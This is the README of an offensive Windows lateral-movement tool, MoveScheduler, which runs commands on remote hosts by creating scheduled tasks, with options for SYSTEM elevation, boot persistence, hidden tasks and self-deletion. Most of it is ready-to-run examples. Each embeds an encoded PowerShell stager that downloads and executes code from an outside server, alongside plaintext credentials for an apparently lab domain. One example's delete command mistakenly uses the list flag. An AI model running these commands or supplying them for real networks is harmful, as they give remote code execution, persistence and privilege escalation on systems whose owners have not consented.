# MoveScheduler

`MoveScheduler` is another weekend binge that focuses on lateral movement via several different methods of scheduling tasks:

1. [Win32_ScheduledJob (C#)](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-scheduledjob)
2. [Win32_Scheduledjob (PowerShell)](./PowerShell/Win32_ScheduledJob.ps1)
3. [TaskScheduler Library](https://github.com/dahall/TaskScheduler)
4. [PS_ScheduleTask](./PowerShell/PS_ScheduleTask.ps1)

These ~4 techniques have some pros and cons. Most notably, the TaskScheduler Library has the most pros. It allows for elevation to `NT AUTHORITY\SYSTEM`, on event triggers, on boot persistence, being able to trigger the job as a different user and so on. Here is a short intro to the library:

> The Task Scheduler Managed Class Library provides a single assembly  wrapper for the 1.0 and 2.0 versions of Task Scheduler found in all  Microsoft operating systems post Windows 98. It simplifies the coding,  aggregates the multiple versions, provides an editor and allows for  localization support.

The [documentation](https://dahall.github.io/TaskScheduler/html/R_Project_TaskScheduler.htm) discusses this at length. The next competitor is the `Win32_ScheduleJob` class. This has two hard blockers.

1. Has a character limit of approx. 260 characters for the command
2. Relies on the `AT Protocol`.

As this is an older technique, it requires a registry key to enable the `AT Protocol`. This can be done with:

```powershell
Get-ItemProperty Registry::\"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration\"
```

With that, ensure that `EnableAt` is set to `1`. Again, this is not preferable.

`PS_ScheduleTask` is a PowerShell implementation:

```powershell
$ShedService = new-object -comobject "Schedule.Service"
```

To accompany this, there is also a PowerShell implementation of the `Win32_ScheduledJob` class. Both available here:

1. [PS_ScheduleTask](./PowerShell/PS_ScheduleTask.ps1)
2. [Win32_Scheduledjob (PowerShell)](./PowerShell/Win32_ScheduledJob.ps1)

On the back of all that, `MoveScheduler` implements two of this methods; the TaskScheduler Library and the `Win32_ScheduledJob` class. 

The `help`:

```
MoveScheduler 1.0.0.0
Copyright ©  2020

  -m, --method         Required. MoveScheduler method to execute with (Win32_ScheduledJob or SchedulerAPI)

  -t, --target         Required. Target to create job on

  -d, --domain         Domain name to use for authentication (defaults to current user)

  -u, --username       Username to use for authentication (defaults to current user)

  -p, --password       Password to use for authentication (defaults to current user)

  -c, --command        Command to embed into job

  --taskname           Name to give task (Defaults to random string) (SchedulerAPI Only)

  --taskdescription    Description to give task (Defaults to random string) (SchedulerAPI Only)

  --deleteafter        Delete job after X seconds when executed (default 10 seconds) (SchedulerAPI Only)

  --time               Time until execution takes place (1 minute default)

  --onstartup          Set an additional trigger for system startup (SchedulerAPI Only)

  --wakeup             Wake computer up when job is due (SchedulerAPI Only)

  --system             Elevate to SYSTEM (SchedulerAPI Only)

  --diffdomain         Domain for different user to run job (SchedulerAPI Only)

  --diffuser           User for different user to run job (SchedulerAPI Only)

  --diffpassword       Password for different user to run job (SchedulerAPI Only)

  --list               List scheduled tasks (SchedulerAPI Only)

  --delete             Delete scheduled task (SchedulerAPI Only)

  --help               Display this help screen.

  --version            Display version information.
```

The main flag here being `-m` and the corresponding method. Alot of the functionality above is only accessible via the Task Scheduler Library.

The `Win32_ScheduledJob` implementation is limited:

```csharp
object[] cmdParams = { Command, StartTime, false, null, null, true, 100 };
```

The syntax:

```cpp
uint32 Create(
  [in]           string   Command,
  [in]           datetime StartTime,
  [in, optional] boolean  RunRepeatedly,
  [in, optional] uint32   DaysOfWeek,
  [in, optional] uint32   DaysOfMonth,
  [in, optional] boolean  InteractWithDesktop,
  [out]          uint32   JobId
);
```

And thats it for the WMI class, moving onto TaskScheduler. 

When defining a task, it has several settings that are noteworthy:

```csharp
TaskDefinition taskDefinition = taskService.NewTask();

taskDefinition.RegistrationInfo.Description = TaskDescription;
taskDefinition.RegistrationInfo.Author = UserName;
taskDefinition.Settings.Hidden = true;
taskDefinition.Settings.StartWhenAvailable = true;
taskDefinition.Settings.Enabled = true;
taskDefinition.Settings.DeleteExpiredTaskAfter = TimeSpan.FromSeconds(DeleteAfter);
```

The final setting here ensures that the job is deleted after execution, tidying it up. The only downside I found with this was the the job is always added to the root. However, their is functionality to create a new folder, so its likely that the job can be moved and I'm just blind.

A pro tip I found whilst testing this, ensure that the potential time different is accounted for and use the `--time` flag.

Other than that, the `help` is self-explanatory, but here is some examples:

## TaskScheduler

Note the `-m` flag as `SchedulerAPI`.

**<u>Current Context:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.100 -c 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAxAC4AMQAxADkAOgA4ADAAOAAwAC8AYQAvAGQAawB1AHMAVAAzADgAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMQAuADEAMQA5ADoAOAAwADgAMAAvAGEAJwApACkAOwA='
```

**<u>Authenticate as:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.100 -c 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAxAC4AMQAxADkAOgA4ADAAOAAwAC8AYQAvAGQAawB1AHMAVAAzADgAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMQAuADEAMQA5ADoAOAAwADgAMAAvAGEAJwApACkAOwA=' -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M'
```

**<u>Job to run as a different user:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.113 -c 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAxAC4AMQAxADkAOgA4ADAAOAAwAC8AYQAvAGQAawB1AHMAVAAzADgAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMQAuADEAMQA5ADoAOAAwADgAMAAvAGEAJwApACkAOwA=' -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M' --diffdomain avatar.local --diffuser aang --diffpassword 'U5Tp3*neMk'
```

**<u>Execute as SYSTEM:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.113 -c 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB2AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHYALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB2AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAxAC4AMQAxADkAOgA4ADAAOAAwAC8ASgA3AFUAeQBQAEEATQBmAFcALwByAHoAQQBpADMAMABKADQAdABvACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADEALgAxADEAOQA6ADgAMAA4ADAALwBKADcAVQB5AFAAQQBNAGYAVwAnACkAKQA7AA==' -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M' --system
```

**<u>List jobs:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.113 -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M' --list
```

**<u>Delete job:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.113 -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M' --list jobname
```

**<u>On boot persistence:</u>**

```powershell
.\MoveScheduler.exe -m SchedulerAPI -t 10.10.11.113 -c 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB2AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHYALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB2AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAxAC4AMQAxADkAOgA4ADAAOAAwAC8ASgA3AFUAeQBQAEEATQBmAFcALwByAHoAQQBpADMAMABKADQAdABvACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADEALgAxADEAOQA6ADgAMAA4ADAALwBKADcAVQB5AFAAQQBNAGYAVwAnACkAKQA7AA==' -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M' --onstartup
```

## Win32_ScheduledJob

Note the `Win32_ScheduledJob` `-m` flag. If a return value of `8` is set, thats likely due to AT not being enabled.

```powershell
.\MoveScheduler.exe -m Win32_ScheduledJob -t 10.10.11.100 -c 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGwALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAxAC4AMQAxADkAOgA4ADAAOAAwAC8AYQAvAGQAawB1AHMAVAAzADgAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMQAuADEAMQA5ADoAOAAwADgAMAAvAGEAJwApACkAOwA=' -d avatar.local -u 'iroh' -p '3JyE63D%xu!4mBwnTHtvY8bhU2Z2r^M'
```

